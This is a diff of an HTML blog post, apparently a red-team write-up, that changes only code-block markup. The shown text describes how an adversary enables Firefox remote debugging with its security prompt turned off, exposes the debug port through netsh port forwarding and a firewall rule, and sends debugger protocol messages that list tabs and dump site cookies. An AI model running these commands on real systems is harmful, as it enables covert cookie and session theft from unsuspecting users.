@@ -157,7 +157,7 @@
 <p><code>$AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\</code></p>
 <p><em>Note:</em> There might be multiple profiles present in the folder.</p>
 <p>These are the updates that are required to enabled remote debugging:</p>
-<pre><code>user_pref(&quot;devtools.chrome.enabled&quot;, true);
+<pre tabindex="0"><code>user_pref(&quot;devtools.chrome.enabled&quot;, true);
 user_pref(&quot;devtools.debugger.remote-enabled&quot;, true);
 user_pref(&quot;devtools.debugger.prompt-connection&quot;, false);
 </code></pre><p>These updates the remote debugging features, and disables security prompts the user would normally see by default.</p>
@@ -178,7 +178,7 @@ user_pref(&quot;devtools.debugger.prompt-connection&quot;, false);
 <h2 id="tunneling-traffic-to-remote-machines">Tunneling traffic to remote machines</h2>
 <p>The debugging port is only available locally, an adversary will try to make that remotely accessible via port forwarding. I talked about <a href="http://localhost:1313/blog/posts/2020/windows-port-forward/">this</a> here in a bit more detail, but below are the basic commands needed.</p>
 <p>In Windows, this can be done by an Administrator using:</p>
-<pre><code>netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=48333 connectaddress=127.0.0.1 connectport=9222
+<pre tabindex="0"><code>netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=48333 connectaddress=127.0.0.1 connectport=9222
 </code></pre><p>Now, remote connections to this port will not be allowed because the firewall blocks them (we forwarded to port 48333). We have to add a new firewall rule to allow port 48333. So, let&rsquo;s allow that port through the firewall.</p>
 <p>There are multiple ways to do this on Windows, but since we already used nets let&rsquo;s stick with it:</p>
 <p><code>netsh advfirewall firewall add rule name=&quot;Open Port 48333&quot; dir=in action=allow protocol=TCP localport=48333</code></p>
@@ -212,7 +212,7 @@ user_pref(&quot;devtools.debugger.prompt-connection&quot;, false);
 <p>Connect via telnet or netcat, and send the following strings in:</p>
 <p><code>30:{&quot;type&quot;:&quot;getRoot&quot;,&quot;to&quot;:&quot;root&quot;}</code></p>
 <p>Some other commands I figured out to get the contents of a site:</p>
-<pre><code>31:{&quot;to&quot;:&quot;root&quot;,&quot;type&quot;:&quot;listTabs&quot;}
+<pre tabindex="0"><code>31:{&quot;to&quot;:&quot;root&quot;,&quot;type&quot;:&quot;listTabs&quot;}
 57:{&quot;type&quot;:&quot;getTarget&quot;,&quot;to&quot;:&quot;server1.conn21.tabDescriptor7&quot;}
 65:{&quot;type&quot;:&quot;listStores&quot;,&quot;to&quot;:&quot;server1.conn21.child21/storageActor5&quot;}
 124:{&quot;type&quot;:&quot;getStoreObjects&quot;,&quot;host&quot;:&quot;https://www.google.com&quot;,&quot;names&quot;:null,&quot;options&quot;:{},&quot;to&quot;:&quot;server1.conn21.child21/cookies20&quot;}
